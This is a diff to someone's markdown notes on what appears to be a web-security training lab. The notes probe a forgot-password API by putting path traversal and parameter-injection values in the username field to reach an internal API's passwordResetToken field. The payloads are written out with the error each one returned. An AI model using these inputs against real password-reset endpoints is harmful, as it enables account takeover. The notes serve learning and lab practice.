@@ -1581,9 +1581,14 @@ CONNECT
     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?**passwordResetToken=123** > invalid token   
   - Trial and Error **API routes**   
     POST /forgot-password   
-    username=administrator`/../../../../../openapi.json%23`   
-    Result: Error: **/api/internal/v1/users/{username}/field/{field}**   
-  - Test for **field name**   
+    username=administrator > Results return   
+    username=administrator? > Error: Invalid route. Please refer to the API definiition.   
+  - try path travelsal techniques   
+    username=../administrator > Invalid route   
+    username=../../../../../administrator > Error: Unexpected response from API   
+    username=`/../../../../../openapi.json%23` > Error: **/api/internal/v1/users/{username}/field/{field}**   
+  - Test for **field name**
+    username=administrator/field/invalid > The provided field name "invalid" does not exist
     username=administrator/field/passwordResetToken#   
     Result: Error: **This version of API only** supports the email field for security reasons   
   - Try **other version API**   
